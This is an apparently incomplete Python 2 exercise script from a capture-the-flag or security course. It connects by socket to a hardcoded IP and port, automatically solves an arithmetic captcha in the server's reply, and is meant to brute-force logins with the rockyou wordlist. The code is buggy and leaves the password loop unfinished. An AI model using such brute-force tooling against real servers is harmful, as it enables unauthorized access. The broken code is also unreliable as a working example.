"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import re
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
result="Fail"
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    '''
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
    '''
    f = open(wordlist, "r")
    lines=f.readline
    count=0

    while count < len(lines) and result == "Fail": 
   # Establish socket connection
    #add loop to go through checking if got correct password
        i+=1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        #    Reading:

        data = s.recv(1024)
    # Receives 1024 bytes from IP/Port
        time.sleep(5)
        print(data)             # Prints data
        entries = re.split("\n+", data)
        print entries
        parts=entries[2].split(" ")
        print parts
        int1=int(parts[0])
        int2=int(parts[2])
        if parts[1]=="/":
            answer= int1/int2
        elif parts[1]=="+":
            answer= int1+int2
        elif parts[1]=="-":
            answer= int1-int2
        else:
            answer= int1*int2
        print answer
    
    #elems=re.findall('<num1>(\d+)\s<operand>(\/|\+|\-|\*)\s<num2>(\d+)\s=\s\?',data)
    #elems.
    #m = /(<int1>\d+)\s(<operand>\/|\+|\-|\*)\s(<int2>\d+)\s=\s\?/.match(entries[2])
    #print m.captures
    

    #extract=re.search("",data)           
                 #regex the recaptcha
                 #answer=
         #   Sending:
    #when you fail password do s.close
        s.send(str(answer)+'\n')   # Send a newline \n at the end of your command
        response=s.recv(1024)
        time.sleep(5)
        print response
#when you get the password you print out i got the password and print it out
    '''
        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    '''

    username = ""  # Hint: use OSINT
    password = ""   # Hint: use wordlist




if __name__ == '__main__':
    brute_force()
